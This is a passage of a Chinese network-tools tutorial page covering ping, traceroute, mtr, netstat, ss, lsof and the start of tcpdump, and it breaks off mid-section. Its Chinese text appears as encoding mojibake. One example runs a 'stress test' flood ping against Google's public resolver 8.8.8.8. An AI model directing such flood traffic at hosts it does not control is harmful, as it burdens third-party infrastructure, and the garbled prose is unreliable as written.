

<!DOCTYPE html>
<html class="writer-html5" lang="zh-CN" data-content_root="../">
<head>
  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>ç½‘ç»œå·¥å…·å¤§å…¨ &mdash; OS &amp; Network Core 1.0.0 æ–‡æ¡£</title>
      <link rel="stylesheet" type="text/css" href="../_static/pygments.css?v=b86133f3" />
      <link rel="stylesheet" type="text/css" href="../_static/css/theme.css?v=e59714d7" />
      <link rel="stylesheet" type="text/css" href="../_static/custom.css?v=f07cb45e" />

  
    <link rel="shortcut icon" href="../_static/favicon.ico"/>
      <script src="../_static/jquery.js?v=5d32c60e"></script>
      <script src="../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
      <script src="../_static/documentation_options.js?v=34088549"></script>
      <script src="../_static/doctools.js?v=9a2dae69"></script>
      <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
      <script src="../_static/translations.js?v=beaddf03"></script>
    <script src="../_static/js/theme.js"></script>
    <link rel="index" title="ç´¢å¼•" href="../genindex.html" />
    <link rel="search" title="æœç´¢" href="../search.html" />
    <link rel="next" title="ç½‘ç»œå®‰å…¨åŸºç¡€" href="../11-network-security/index.html" />
    <link rel="prev" title="ç½‘ç»œå·¥å…·å¤§å…¨" href="index.html" /> 
</head>

<body class="wy-body-for-nav"> 
  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search"  style="background: #2980B9" >

          
          
          <a href="../index.html" class="icon icon-home">
            OS & Network Core
          </a>
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="æœç´¢æ–‡æ¡£" aria-label="æœç´¢æ–‡æ¡£" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>
        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="å¯¼èˆªèœå•">
              <p class="caption" role="heading"><span class="caption-text">ç›®å½•</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../introduction.html">OS &amp; Network Core</a></li>
<li class="toctree-l1"><a class="reference internal" href="../01-process-thread/index.html">è¿›ç¨‹ä¸çº¿ç¨‹</a></li>
<li class="toctree-l1"><a class="reference internal" href="../02-process-scheduling/index.html">è¿›ç¨‹è°ƒåº¦</a></li>
<li class="toctree-l1"><a class="reference internal" href="../03-memory-management/index.html">å†…å­˜ç®¡ç†</a></li>
<li class="toctree-l1"><a class="reference internal" href="../04-file-system/index.html">æ–‡ä»¶ç³»ç»Ÿ</a></li>
<li class="toctree-l1"><a class="reference internal" href="../05-concurrency-sync/index.html">å¹¶å‘ä¸åŒæ­¥</a></li>
<li class="toctree-l1"><a class="reference internal" href="../06-deadlock/index.html">æ­»é”å¤„ç†</a></li>
<li class="toctree-l1"><a class="reference internal" href="../07-tcp-ip/index.html">TCP-IPåè®®è¯¦è§£</a></li>
<li class="toctree-l1"><a class="reference internal" href="../08-http/index.html">HTTPåè®®ä¸å®æˆ˜</a></li>
<li class="toctree-l1"><a class="reference internal" href="../09-socket/index.html">Socketç¼–ç¨‹å®æˆ˜</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="index.html">ç½‘ç»œå·¥å…·å¤§å…¨</a><ul class="current">
<li class="toctree-l2 current"><a class="current reference internal" href="#">ç½‘ç»œå·¥å…·å¤§å…¨</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id2">ğŸ’¡ æ ¸å¿ƒç»“è®º</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id3">1. è¿é€šæ€§æµ‹è¯•å·¥å…·</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#ping">1.1 ping</a></li>
<li class="toctree-l4"><a class="reference internal" href="#traceroute-tracert">1.2 traceroute/tracert</a></li>
<li class="toctree-l4"><a class="reference internal" href="#mtr">1.3 mtr</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id4">2. è¿æ¥å’Œç«¯å£æŸ¥çœ‹å·¥å…·</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#netstat">2.1 netstat</a></li>
<li class="toctree-l4"><a class="reference internal" href="#ss">2.2 ss</a></li>
<li class="toctree-l4"><a class="reference internal" href="#lsof">2.3 lsof</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id5">3. æŠ“åŒ…å’Œåˆ†æå·¥å…·</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#tcpdump">3.1 tcpdump</a></li>
<li class="toctree-l4"><a class="reference internal" href="#wireshark">3.2 Wireshark</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#http">4. HTTPæµ‹è¯•å·¥å…·</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#curl">4.1 curl</a></li>
<li class="toctree-l4"><a class="reference internal" href="#wget">4.2 wget</a></li>
<li class="toctree-l4"><a class="reference internal" href="#httpie">4.3 httpie</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id6">5. ç½‘ç»œæ‰«æå·¥å…·</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#nmap">5.1 nmap</a></li>
<li class="toctree-l4"><a class="reference internal" href="#nc-netcat">5.2 nc (netcat)</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id7">6. æ€§èƒ½æµ‹è¯•å·¥å…·</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#iperf">6.1 iperf</a></li>
<li class="toctree-l4"><a class="reference internal" href="#ab-apache-bench">6.2 ab (Apache Bench)</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#dns">7. DNSå·¥å…·</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#nslookup">7.1 nslookup</a></li>
<li class="toctree-l4"><a class="reference internal" href="#dig">7.2 dig</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id8">8. ç»¼åˆè¯Šæ–­</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id9">å‚è€ƒèµ„æº</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../11-network-security/index.html">ç½‘ç»œå®‰å…¨åŸºç¡€</a></li>
</ul>

        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="ç§»åŠ¨ç‰ˆå¯¼èˆªèœå•"  style="background: #2980B9" >
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">OS & Network Core</a>
      </nav>

      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="é¡µé¢å¯¼èˆª">
  <ul class="wy-breadcrumbs">
      <li><a href="../index.html" class="icon icon-home" aria-label="Home"></a></li>
          <li class="breadcrumb-item"><a href="index.html">ç½‘ç»œå·¥å…·å¤§å…¨</a></li>
      <li class="breadcrumb-item active">ç½‘ç»œå·¥å…·å¤§å…¨</li>
      <li class="wy-breadcrumbs-aside">
            <a href="../_sources/10-network-tools/README.md.txt" rel="nofollow"> æŸ¥çœ‹é¡µé¢æºç </a>
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
             
  <section class="tex2jax_ignore mathjax_ignore" id="id1">
<h1>ç½‘ç»œå·¥å…·å¤§å…¨<a class="headerlink" href="#id1" title="Link to this heading">ïƒ</a></h1>
<section id="id2">
<h2>ğŸ’¡ æ ¸å¿ƒç»“è®º<a class="headerlink" href="#id2" title="Link to this heading">ïƒ</a></h2>
<ol class="arabic simple">
<li><p><strong>pingæ£€æµ‹è¿é€šæ€§ï¼Œtracerouteè¿½è¸ªè·¯ç”±è·¯å¾„</strong></p></li>
<li><p><strong>netstat/ssæŸ¥çœ‹ç½‘ç»œè¿æ¥çŠ¶æ€ï¼ŒlsofæŸ¥çœ‹ç«¯å£å ç”¨</strong></p></li>
<li><p><strong>tcpdump/WiresharkæŠ“åŒ…åˆ†æï¼Œæ˜¯ç½‘ç»œè°ƒè¯•çš„åˆ©å™¨</strong></p></li>
<li><p><strong>curl/wgetæµ‹è¯•HTTPï¼Œnmapæ‰«æç«¯å£å’ŒæœåŠ¡</strong></p></li>
<li><p><strong>iperfæµ‹è¯•å¸¦å®½ï¼Œmtrç»¼åˆè¯Šæ–­ç½‘ç»œé—®é¢˜</strong></p></li>
</ol>
</section>
<hr class="docutils" />
<section id="id3">
<h2>1. è¿é€šæ€§æµ‹è¯•å·¥å…·<a class="headerlink" href="#id3" title="Link to this heading">ïƒ</a></h2>
<section id="ping">
<h3>1.1 ping<a class="headerlink" href="#ping" title="Link to this heading">ïƒ</a></h3>
<p><strong>åŠŸèƒ½</strong>ï¼šæµ‹è¯•ä¸»æœºå¯è¾¾æ€§å’Œç½‘ç»œå»¶è¿Ÿ</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># åŸºæœ¬ç”¨æ³•</span>
$<span class="w"> </span>ping<span class="w"> </span>www.baidu.com
PING<span class="w"> </span>www.a.shifen.com<span class="w"> </span><span class="o">(</span><span class="m">14</span>.215.177.38<span class="o">)</span>:<span class="w"> </span><span class="m">56</span><span class="w"> </span>data<span class="w"> </span>bytes
<span class="m">64</span><span class="w"> </span>bytes<span class="w"> </span>from<span class="w"> </span><span class="m">14</span>.215.177.38:<span class="w"> </span><span class="nv">icmp_seq</span><span class="o">=</span><span class="m">0</span><span class="w"> </span><span class="nv">ttl</span><span class="o">=</span><span class="m">54</span><span class="w"> </span><span class="nv">time</span><span class="o">=</span><span class="m">8</span>.123<span class="w"> </span>ms
<span class="m">64</span><span class="w"> </span>bytes<span class="w"> </span>from<span class="w"> </span><span class="m">14</span>.215.177.38:<span class="w"> </span><span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span><span class="w"> </span><span class="nv">ttl</span><span class="o">=</span><span class="m">54</span><span class="w"> </span><span class="nv">time</span><span class="o">=</span><span class="m">7</span>.892<span class="w"> </span>ms

<span class="c1"># å‘é€æŒ‡å®šæ•°é‡çš„åŒ…</span>
$<span class="w"> </span>ping<span class="w"> </span>-c<span class="w"> </span><span class="m">4</span><span class="w"> </span><span class="m">8</span>.8.8.8

<span class="c1"># è®¾ç½®åŒ…å¤§å°</span>
$<span class="w"> </span>ping<span class="w"> </span>-s<span class="w"> </span><span class="m">1024</span><span class="w"> </span><span class="m">8</span>.8.8.8

<span class="c1"># è®¾ç½®æ—¶é—´é—´éš”</span>
$<span class="w"> </span>ping<span class="w"> </span>-i<span class="w"> </span><span class="m">0</span>.2<span class="w"> </span><span class="m">8</span>.8.8.8

<span class="c1"># flood pingï¼ˆå‹åŠ›æµ‹è¯•ï¼‰</span>
$<span class="w"> </span>sudo<span class="w"> </span>ping<span class="w"> </span>-f<span class="w"> </span><span class="m">8</span>.8.8.8

<span class="c1"># è®¾ç½®TTL</span>
$<span class="w"> </span>ping<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="m">8</span>.8.8.8
</pre></div>
</div>
<p><strong>åŸç†</strong>ï¼šå‘é€ICMP Echo Requestï¼Œæ¥æ”¶Echo Reply</p>
<p><strong>å¸¸è§ç»“æœ</strong>ï¼š</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">time</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="n">ms</span>   <span class="p">:</span> <span class="n">æå¥½</span>
<span class="n">time</span> <span class="o">&lt;</span> <span class="mi">50</span><span class="n">ms</span>   <span class="p">:</span> <span class="n">è‰¯å¥½</span>
<span class="n">time</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="n">ms</span>  <span class="p">:</span> <span class="n">ä¸€èˆ¬</span>
<span class="n">time</span> <span class="o">&gt;</span> <span class="mi">200</span><span class="n">ms</span>  <span class="p">:</span> <span class="n">è¾ƒå·®</span>
<span class="n">Request</span> <span class="n">timeout</span><span class="p">:</span> <span class="n">ç½‘ç»œä¸é€šæˆ–é˜²ç«å¢™é˜»æ­¢</span>
</pre></div>
</div>
</section>
<section id="traceroute-tracert">
<h3>1.2 traceroute/tracert<a class="headerlink" href="#traceroute-tracert" title="Link to this heading">ïƒ</a></h3>
<p><strong>åŠŸèƒ½</strong>ï¼šè¿½è¸ªæ•°æ®åŒ…åˆ°ç›®æ ‡çš„è·¯ç”±è·¯å¾„</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Linux/Mac</span>
$<span class="w"> </span>traceroute<span class="w"> </span>www.baidu.com
traceroute<span class="w"> </span>to<span class="w"> </span>www.a.shifen.com<span class="w"> </span><span class="o">(</span><span class="m">14</span>.215.177.38<span class="o">)</span>,<span class="w"> </span><span class="m">30</span><span class="w"> </span>hops<span class="w"> </span>max
<span class="w"> </span><span class="m">1</span><span class="w">  </span><span class="m">192</span>.168.1.1<span class="w"> </span><span class="o">(</span><span class="m">192</span>.168.1.1<span class="o">)</span><span class="w">  </span><span class="m">1</span>.234<span class="w"> </span>ms<span class="w">  </span><span class="m">1</span>.123<span class="w"> </span>ms<span class="w">  </span><span class="m">1</span>.089<span class="w"> </span>ms
<span class="w"> </span><span class="m">2</span><span class="w">  </span><span class="m">10</span>.0.0.1<span class="w"> </span><span class="o">(</span><span class="m">10</span>.0.0.1<span class="o">)</span><span class="w">  </span><span class="m">2</span>.345<span class="w"> </span>ms<span class="w">  </span><span class="m">2</span>.234<span class="w"> </span>ms<span class="w">  </span><span class="m">2</span>.123<span class="w"> </span>ms
<span class="w"> </span><span class="m">3</span><span class="w">  </span>*<span class="w"> </span>*<span class="w"> </span>*
<span class="w"> </span><span class="m">4</span><span class="w">  </span><span class="m">14</span>.215.177.38<span class="w"> </span><span class="o">(</span><span class="m">14</span>.215.177.38<span class="o">)</span><span class="w">  </span><span class="m">8</span>.123<span class="w"> </span>ms<span class="w">  </span><span class="m">7</span>.890<span class="w"> </span>ms<span class="w">  </span><span class="m">7</span>.765<span class="w"> </span>ms

<span class="c1"># Windows</span>
$<span class="w"> </span>tracert<span class="w"> </span>www.baidu.com

<span class="c1"># ä½¿ç”¨ICMPè€Œä¸æ˜¯UDP</span>
$<span class="w"> </span>traceroute<span class="w"> </span>-I<span class="w"> </span>www.baidu.com

<span class="c1"># æŒ‡å®šæœ€å¤§è·³æ•°</span>
$<span class="w"> </span>traceroute<span class="w"> </span>-m<span class="w"> </span><span class="m">15</span><span class="w"> </span>www.baidu.com

<span class="c1"># ä¸è§£æä¸»æœºåï¼ˆæ›´å¿«ï¼‰</span>
$<span class="w"> </span>traceroute<span class="w"> </span>-n<span class="w"> </span><span class="m">8</span>.8.8.8
</pre></div>
</div>
<p><strong>åŸç†</strong>ï¼š</p>
<ol class="arabic simple">
<li><p>å‘é€TTL=1çš„åŒ…ï¼Œç¬¬ä¸€è·³è·¯ç”±å™¨è¿”å›ICMP Time Exceeded</p></li>
<li><p>å‘é€TTL=2çš„åŒ…ï¼Œç¬¬äºŒè·³è·¯ç”±å™¨è¿”å›</p></li>
<li><p>ä¾æ¬¡é€’å¢TTLï¼Œç›´åˆ°åˆ°è¾¾ç›®æ ‡</p></li>
</ol>
</section>
<section id="mtr">
<h3>1.3 mtr<a class="headerlink" href="#mtr" title="Link to this heading">ïƒ</a></h3>
<p><strong>åŠŸèƒ½</strong>ï¼šç»“åˆpingå’Œtracerouteï¼ŒæŒç»­ç›‘æ§</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># äº¤äº’å¼ç•Œé¢</span>
$<span class="w"> </span>mtr<span class="w"> </span>www.baidu.com

<span class="c1"># æŠ¥å‘Šæ¨¡å¼ï¼ˆå‘é€10ä¸ªåŒ…ï¼‰</span>
$<span class="w"> </span>mtr<span class="w"> </span>-r<span class="w"> </span>-c<span class="w"> </span><span class="m">10</span><span class="w"> </span>www.baidu.com

<span class="c1"># CSVæ ¼å¼è¾“å‡º</span>
$<span class="w"> </span>mtr<span class="w"> </span>--csv<span class="w"> </span>www.baidu.com

<span class="c1"># åªæ˜¾ç¤ºIPä¸è§£æåŸŸå</span>
$<span class="w"> </span>mtr<span class="w"> </span>-n<span class="w"> </span><span class="m">8</span>.8.8.8
</pre></div>
</div>
<p><strong>è¾“å‡ºè§£é‡Š</strong>ï¼š</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>                          Loss%   Snt   Last   Avg  Best  Wrst StDev
1. 192.168.1.1             0.0%    10    1.2   1.3   1.1   1.5   0.1
2. 10.0.0.1                0.0%    10    2.3   2.4   2.2   2.6   0.1
3. ???                   100.0%    10    0.0   0.0   0.0   0.0   0.0
4. 14.215.177.38           0.0%    10    8.1   8.2   7.9   8.5   0.2

Loss%: ä¸¢åŒ…ç‡
Snt:   å‘é€çš„åŒ…æ•°
Avg:   å¹³å‡å»¶è¿Ÿ
Best:  æœ€å°å»¶è¿Ÿ
Wrst:  æœ€å¤§å»¶è¿Ÿ
StDev: æ ‡å‡†å·®ï¼ˆæŠ–åŠ¨ï¼‰
</pre></div>
</div>
</section>
</section>
<hr class="docutils" />
<section id="id4">
<h2>2. è¿æ¥å’Œç«¯å£æŸ¥çœ‹å·¥å…·<a class="headerlink" href="#id4" title="Link to this heading">ïƒ</a></h2>
<section id="netstat">
<h3>2.1 netstat<a class="headerlink" href="#netstat" title="Link to this heading">ïƒ</a></h3>
<p><strong>åŠŸèƒ½</strong>ï¼šæ˜¾ç¤ºç½‘ç»œè¿æ¥ã€è·¯ç”±è¡¨ã€æ¥å£ç»Ÿè®¡</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># æ˜¾ç¤ºæ‰€æœ‰TCPè¿æ¥</span>
$<span class="w"> </span>netstat<span class="w"> </span>-t

<span class="c1"># æ˜¾ç¤ºæ‰€æœ‰UDPè¿æ¥</span>
$<span class="w"> </span>netstat<span class="w"> </span>-u

<span class="c1"># æ˜¾ç¤ºç›‘å¬ç«¯å£</span>
$<span class="w"> </span>netstat<span class="w"> </span>-l

<span class="c1"># æ˜¾ç¤ºæ‰€æœ‰è¿æ¥å’Œç›‘å¬ç«¯å£</span>
$<span class="w"> </span>netstat<span class="w"> </span>-a

<span class="c1"># ä¸è§£æä¸»æœºåå’Œç«¯å£åï¼ˆæ›´å¿«ï¼‰</span>
$<span class="w"> </span>netstat<span class="w"> </span>-n

<span class="c1"># æ˜¾ç¤ºè¿›ç¨‹ä¿¡æ¯</span>
$<span class="w"> </span>netstat<span class="w"> </span>-p

<span class="c1"># ç»„åˆä½¿ç”¨ï¼ˆæœ€å¸¸ç”¨ï¼‰</span>
$<span class="w"> </span>netstat<span class="w"> </span>-tulnp

<span class="c1"># æ˜¾ç¤ºè·¯ç”±è¡¨</span>
$<span class="w"> </span>netstat<span class="w"> </span>-r

<span class="c1"># æ˜¾ç¤ºç½‘ç»œæ¥å£ç»Ÿè®¡</span>
$<span class="w"> </span>netstat<span class="w"> </span>-i
</pre></div>
</div>
<p><strong>è¾“å‡ºç¤ºä¾‹</strong>ï¼š</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Proto</span> <span class="n">Recv</span><span class="o">-</span><span class="n">Q</span> <span class="n">Send</span><span class="o">-</span><span class="n">Q</span> <span class="n">Local</span> <span class="n">Address</span>           <span class="n">Foreign</span> <span class="n">Address</span>         <span class="n">State</span>       <span class="n">PID</span><span class="o">/</span><span class="n">Program</span>
<span class="n">tcp</span>        <span class="mi">0</span>      <span class="mi">0</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">22</span>              <span class="mf">0.0.0.0</span><span class="p">:</span><span class="o">*</span>               <span class="n">LISTEN</span>      <span class="mi">1234</span><span class="o">/</span><span class="n">sshd</span>
<span class="n">tcp</span>        <span class="mi">0</span>      <span class="mi">0</span> <span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">3306</span>          <span class="mf">0.0.0.0</span><span class="p">:</span><span class="o">*</span>               <span class="n">LISTEN</span>      <span class="mi">5678</span><span class="o">/</span><span class="n">mysqld</span>
<span class="n">tcp</span>        <span class="mi">0</span>    <span class="mi">396</span> <span class="mf">192.168.1.100</span><span class="p">:</span><span class="mi">22</span>        <span class="mf">192.168.1.200</span><span class="p">:</span><span class="mi">54321</span>     <span class="n">ESTABLISHED</span> <span class="mi">9012</span><span class="o">/</span><span class="n">sshd</span>
</pre></div>
</div>
</section>
<section id="ss">
<h3>2.2 ss<a class="headerlink" href="#ss" title="Link to this heading">ïƒ</a></h3>
<p><strong>åŠŸèƒ½</strong>ï¼šnetstatçš„ç°ä»£æ›¿ä»£å“ï¼Œæ›´å¿«</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># æ˜¾ç¤ºæ‰€æœ‰TCPè¿æ¥</span>
$<span class="w"> </span>ss<span class="w"> </span>-t

<span class="c1"># æ˜¾ç¤ºç›‘å¬ç«¯å£</span>
$<span class="w"> </span>ss<span class="w"> </span>-l

<span class="c1"># ç»„åˆä½¿ç”¨</span>
$<span class="w"> </span>ss<span class="w"> </span>-tulnp

<span class="c1"># æ˜¾ç¤ºTCPè¿æ¥çš„è¯¦ç»†ä¿¡æ¯</span>
$<span class="w"> </span>ss<span class="w"> </span>-tin

<span class="c1"># æŒ‰çŠ¶æ€è¿‡æ»¤</span>
$<span class="w"> </span>ss<span class="w"> </span>state<span class="w"> </span>established

<span class="c1"># æŒ‰åœ°å€è¿‡æ»¤</span>
$<span class="w"> </span>ss<span class="w"> </span>dst<span class="w"> </span><span class="m">8</span>.8.8.8

<span class="c1"># æŒ‰ç«¯å£è¿‡æ»¤</span>
$<span class="w"> </span>ss<span class="w"> </span><span class="nv">sport</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>:80
$<span class="w"> </span>ss<span class="w"> </span><span class="nv">dport</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>:443

<span class="c1"># æ˜¾ç¤ºè¿›ç¨‹ä¿¡æ¯</span>
$<span class="w"> </span>ss<span class="w"> </span>-p

<span class="c1"># æ˜¾ç¤ºTCPå†…å­˜ä½¿ç”¨</span>
$<span class="w"> </span>ss<span class="w"> </span>-tm
</pre></div>
</div>
<p><strong>è¾“å‡ºç¤ºä¾‹</strong>ï¼š</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">State</span>    <span class="n">Recv</span><span class="o">-</span><span class="n">Q</span> <span class="n">Send</span><span class="o">-</span><span class="n">Q</span> <span class="n">Local</span> <span class="n">Address</span><span class="p">:</span><span class="n">Port</span>  <span class="n">Peer</span> <span class="n">Address</span><span class="p">:</span><span class="n">Port</span>
<span class="n">LISTEN</span>   <span class="mi">0</span>      <span class="mi">128</span>    <span class="o">*</span><span class="p">:</span><span class="mi">22</span>                <span class="o">*</span><span class="p">:</span><span class="o">*</span>
<span class="n">ESTAB</span>    <span class="mi">0</span>      <span class="mi">0</span>      <span class="mf">192.168.1.100</span><span class="p">:</span><span class="mi">22</span>    <span class="mf">192.168.1.200</span><span class="p">:</span><span class="mi">54321</span>
</pre></div>
</div>
</section>
<section id="lsof">
<h3>2.3 lsof<a class="headerlink" href="#lsof" title="Link to this heading">ïƒ</a></h3>
<p><strong>åŠŸèƒ½</strong>ï¼šåˆ—å‡ºæ‰“å¼€çš„æ–‡ä»¶ï¼ˆåŒ…æ‹¬ç½‘ç»œè¿æ¥ï¼‰</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># æŸ¥çœ‹æŒ‡å®šç«¯å£è¢«å“ªä¸ªè¿›ç¨‹å ç”¨</span>
$<span class="w"> </span>lsof<span class="w"> </span>-i:8080
$<span class="w"> </span>lsof<span class="w"> </span>-i:80-443<span class="w">  </span><span class="c1"># èŒƒå›´</span>

<span class="c1"># æŸ¥çœ‹æŒ‡å®šè¿›ç¨‹çš„ç½‘ç»œè¿æ¥</span>
$<span class="w"> </span>lsof<span class="w"> </span>-p<span class="w"> </span><span class="m">1234</span>

<span class="c1"># æŸ¥çœ‹æŒ‡å®šç”¨æˆ·çš„ç½‘ç»œè¿æ¥</span>
$<span class="w"> </span>lsof<span class="w"> </span>-u<span class="w"> </span>username

<span class="c1"># æŸ¥çœ‹æ‰€æœ‰TCPè¿æ¥</span>
$<span class="w"> </span>lsof<span class="w"> </span>-i<span class="w"> </span>tcp

<span class="c1"># æŸ¥çœ‹æ‰€æœ‰UDPè¿æ¥</span>
$<span class="w"> </span>lsof<span class="w"> </span>-i<span class="w"> </span>udp

<span class="c1"># æŸ¥çœ‹IPv4è¿æ¥</span>
$<span class="w"> </span>lsof<span class="w"> </span>-i<span class="w"> </span><span class="m">4</span>

<span class="c1"># ç»„åˆä½¿ç”¨</span>
$<span class="w"> </span>lsof<span class="w"> </span>-i<span class="w"> </span>tcp<span class="w"> </span>-s<span class="w"> </span>tcp:established
</pre></div>
</div>
<p><strong>è¾“å‡ºç¤ºä¾‹</strong>ï¼š</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">COMMAND</span>   <span class="n">PID</span>     <span class="n">USER</span>   <span class="n">FD</span>   <span class="n">TYPE</span> <span class="n">DEVICE</span> <span class="n">SIZE</span><span class="o">/</span><span class="n">OFF</span> <span class="n">NODE</span> <span class="n">NAME</span>
<span class="n">nginx</span>    <span class="mi">1234</span>     <span class="n">root</span>    <span class="mi">6</span><span class="n">u</span>  <span class="n">IPv4</span>  <span class="mi">12345</span>      <span class="mi">0</span><span class="n">t0</span>  <span class="n">TCP</span> <span class="o">*</span><span class="p">:</span><span class="mi">80</span> <span class="p">(</span><span class="n">LISTEN</span><span class="p">)</span>
<span class="n">chrome</span>   <span class="mi">5678</span>     <span class="n">user</span>   <span class="mi">42</span><span class="n">u</span>  <span class="n">IPv4</span>  <span class="mi">67890</span>      <span class="mi">0</span><span class="n">t0</span>  <span class="n">TCP</span> <span class="mf">192.168.1.100</span><span class="p">:</span><span class="mi">54321</span><span class="o">-&gt;</span><span class="mf">93.184.216.34</span><span class="p">:</span><span class="mi">443</span> <span class="p">(</span><span class="n">ESTABLISHED</span><span class="p">)</span>
</pre></div>
</div>
</section>
</section>
<hr class="docutils" />
<section id="id5">
<h2>3. æŠ“åŒ…å’Œåˆ†æå·¥å…·<a class="headerlink" href="#id5" title="Link to this heading">ïƒ</a></h2>
<section id="tcpdump">
<h3>3.1 tcpdump<a class="headerlink" href="#tcpdump" title="Link to this heading">ïƒ</a></h3>
<p><strong>åŠŸèƒ½</strong>ï¼šå‘½ä»¤è¡ŒæŠ“åŒ…å·¥å…·</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># æŠ“å–æ‰€æœ‰ç½‘å¡çš„åŒ…</span>
$<span class="w"> </span>sudo<span class="w"> </span>tcpdump

<span class="c1"># æŠ“å–æŒ‡å®šç½‘å¡</span>
$<span class="w"> </span>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-i<span class="w"> </span>eth0

<span class="c1"># æŠ“å–æŒ‡å®šä¸»æœºçš„åŒ…</span>
$<span class="w"> </span>sudo<span class="w"> </span>tcpdump<span class="w"> </span>host<span class="w"> </span><span class="m">192</span>.168.1.100

<span class="c1"># æŠ“å–æŒ‡å®šç«¯å£çš„åŒ…</span>
$<span class="w"> </span>sudo<span class="w"> </span>tcpdump<span class="w"> </span>port<span class="w"> </span><span class="m">80</span>

<span class="c1"># æŠ“å–TCPåŒ…</span>
$<span class="w"> </span>sudo<span class="w"> </span>tcpdump<span class="w"> </span>tcp

<span class="c1"># æŠ“å–UDPåŒ…</span>
$<span class="w"> </span>sudo<span class="w"> </span>tcpdump<span class="w"> </span>udp

<span class="c1"># ç»„åˆè¿‡æ»¤</span>
$<span class="w"> </span>sudo<span class="w"> </span>tcpdump<span class="w"> </span><span class="s1">&#39;tcp port 80 and host 192.168.1.100&#39;</span>

<span class="c1"># æŠ“å–æŒ‡å®šæ•°é‡çš„åŒ…</span>
$<span class="w"> </span>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-c<span class="w"> </span><span class="m">100</span>

<span class="c1"># ä¿å­˜åˆ°æ–‡ä»¶</span>
$<span class="w"> </span>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-w<span class="w"> </span>capture.pcap

<span class="c1"># è¯»å–æ–‡ä»¶</span>
$<span class="w"> </span>tcpdump<span class="w"> </span>-r<span class="w"> </span>capture.pcap

<span class="c1"># æ˜¾ç¤ºASCIIå†…å®¹</span>
$<span class="w"> </span>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-A

<span class="c1"># æ˜¾ç¤ºåå…­è¿›åˆ¶å†…å®¹</span>
$<span class="w"> </span>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-X

<span class="c1"># ä¸è§£æä¸»æœºå</span>
$<span class="w"> </span>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-n

<span class="c1"># ä¸è§£æç«¯å£å</span>
$<span class="w"> </span>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-nn

<span class="c1"># æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯</span>
$<span class="w"> </span>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-v
$<span class="w"> </span>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-vv
$<span class="w"> </span>sudo<span class="w"> </span>tcpdump<span class="w"> </span>-vvv
</pre></div>
</div>
<p><strong>å¸¸ç”¨è¿‡æ»¤è¡¨è¾¾å¼</strong>ï¼š</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># æº/ç›®æ ‡IP</span>
